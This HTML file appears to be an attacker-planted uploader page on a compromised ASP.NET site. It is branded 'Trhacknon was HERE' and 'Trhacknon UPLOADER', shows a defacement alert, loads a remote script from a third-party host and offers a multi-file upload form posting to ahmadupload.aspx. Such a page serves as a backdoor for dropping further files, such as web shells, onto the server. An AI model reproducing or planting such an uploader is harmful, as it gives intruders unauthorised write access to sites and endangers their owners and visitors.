
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head><title> Trhacknon was HERE

</title></head>
<body><script type="text/javascript" src="http://yourjavascript.com/2410423208/alert.js"></script><h3>
<script>alert('trhacknon uploader')</script>
<font style="color:red;text-shadow:#000 0px 0px 3px">Trhacknon</font><font style="color:yellow;text-shadow:#000 0px 0px 3px"> UPLOADER</font> </h3>
<br><img src="internationalbat.png"></img>
    <form method="post" action="./ahmadupload.aspx" id="form1" enctype="multipart/form-data">
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUKMTQ3NTQxNjkzOQ9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YRYCAgEPZBYCZg9kFgQCAw8PFgQeBkhlaWdodBsAAAAAAMBdQAEAAAAeBF8hU0ICgAEWAh4Fc3R5bGUFDm92ZXJmbG93OmF1dG87ZAIFD2QWAgIHDw8WAh4EVGV4dAUQTWF4aW11bSBGaWxlczogM2RkZN6wk58AG5PMearp1YMXthL+f3CaFlbaNh9j3Hwb3LBl" />

<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="0C438FDA" />
<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdAAQYpP0Zj61KEJ5+xGD9UrYC+ghkm/I+damDaO5O2+U7/f2umSR093VOlwaeWY2MmR0O/nFdO4v5ykzBlad4bvXGkHPaw6ASVTYdT70ISJnTWD7XNPEM0Qdh2jzjE3KdeY4=" />
    <div>
     <div id="MultipleFileUpload1_pnlParent">
	
    <div id="MultipleFileUpload1_pnlFiles" align="left">
		
        <input type="file" name="MultipleFileUpload1$IpFile" id="MultipleFileUpload1_IpFile" />
    
	</div>
    <div id="MultipleFileUpload1_pnlListBox" style="overflow:auto;">
		
    
	</div>
    <div id="MultipleFileUpload1_pnlButton" align="right">
		
        <input name="MultipleFileUpload1$btnAdd" type="button" id="MultipleFileUpload1_btnAdd" onclick="javascript:Add();" style="width: 60px" value="Add" />
        <input name="MultipleFileUpload1$btnClear" type="button" id="MultipleFileUpload1_btnClear" onclick="javascript:Clear();" style="width: 60px" value="Clear" />
        <input type="submit" name="MultipleFileUpload1$btnUpload" value="Upload" onclick="javascript:return DisableTop();" id="MultipleFileUpload1_btnUpload" />
        <br />
        <span id="MultipleFileUpload1_lblCaption"><b><font face="Verdana" color="Gray" size="1">Maximum Files: 3</font></b></span>&nbsp;
    
	</div>

</div>

    </div>
    
<script type='text/javascript'>var Id = 0;
var MAX = 3;
var DivFiles = document.getElementById('MultipleFileUpload1_pnlFiles');
var DivListBox = document.getElementById('MultipleFileUpload1_pnlListBox');
var BtnAdd = document.getElementById('MultipleFileUpload1_btnAdd');
function Add(){
var IpFile = GetTopFile();
if(IpFile == null || IpFile.value == null || IpFile.value.length == 0)
{
alert('Please select a file to add.');
return;
}
var NewIpFile = CreateFile();
DivFiles.insertBefore(NewIpFile,IpFile);
if(MAX != 0 && GetTotalFiles() - 1 == MAX)
{
NewIpFile.disabled = true;
BtnAdd.disabled = true;
}
IpFile.style.display = 'none';
DivListBox.appendChild(CreateItem(IpFile));
}
function CreateFile(){
var IpFile = document.createElement('input');
IpFile.id = IpFile.name = 'IpFile_' + Id++;
IpFile.type = 'file';
return IpFile;
}
function CreateItem(IpFile)
{
var Item = document.createElement('div');
Item.style.backgroundColor = '#ffffff';
Item.style.fontWeight = 'normal';
Item.style.textAlign = 'left';
Item.style.verticalAlign = 'middle'; 
Item.style.cursor = 'default';
Item.style.height = 20 + 'px';
var Splits = IpFile.value.split('\\');
Item.innerHTML = Splits[Splits.length - 1] + '&nbsp;';
Item.value = IpFile.id;
Item.title = IpFile.value;
var A = document.createElement('a');
A.innerHTML = 'Delete';
A.id = 'A_' + Id++;
A.href = '#';
A.style.color = 'blue';
A.onclick = function()
{
DivFiles.removeChild(document.getElementById(this.parentNode.value));
DivListBox.removeChild(this.parentNode);
if(MAX != 0 && GetTotalFiles() - 1 < MAX)
{
GetTopFile().disabled = false;
BtnAdd.disabled = false;
}
}
Item.appendChild(A);
Item.onmouseover = function()
{
Item.bgColor = Item.style.backgroundColor;
Item.fColor = Item.style.color;
Item.style.backgroundColor = '#C6790B';
Item.style.color = '#ffffff';
Item.style.fontWeight = 'bold';
}
Item.onmouseout = function()
{
Item.style.backgroundColor = Item.bgColor;
Item.style.color = Item.fColor;
Item.style.fontWeight = 'normal';
}
return Item;
}
function Clear()
{
DivListBox.innerHTML = '';
DivFiles.innerHTML = '';
DivFiles.appendChild(CreateFile());
BtnAdd.disabled = false;
}
function GetTopFile()
{
var Inputs = DivFiles.getElementsByTagName('input');
var IpFile = null;
for(var n = 0; n < Inputs.length && Inputs[n].type == 'file'; ++n)
{
IpFile = Inputs[n];
break;
}
return IpFile;
}
function GetTotalFiles()
{
var Inputs = DivFiles.getElementsByTagName('input');
var Counter = 0;
for(var n = 0; n < Inputs.length && Inputs[n].type == 'file'; ++n)
Counter++;
return Counter;
}
function GetTotalItems()
{
var Items = DivListBox.getElementsByTagName('div');
return Items.length;
}
function DisableTop()
{
if(GetTotalItems() == 0)
{
alert('Please browse at least one file to upload.');
return false;
}
GetTopFile().disabled = true;
return true;
}
</script></form>
</body>
</html>
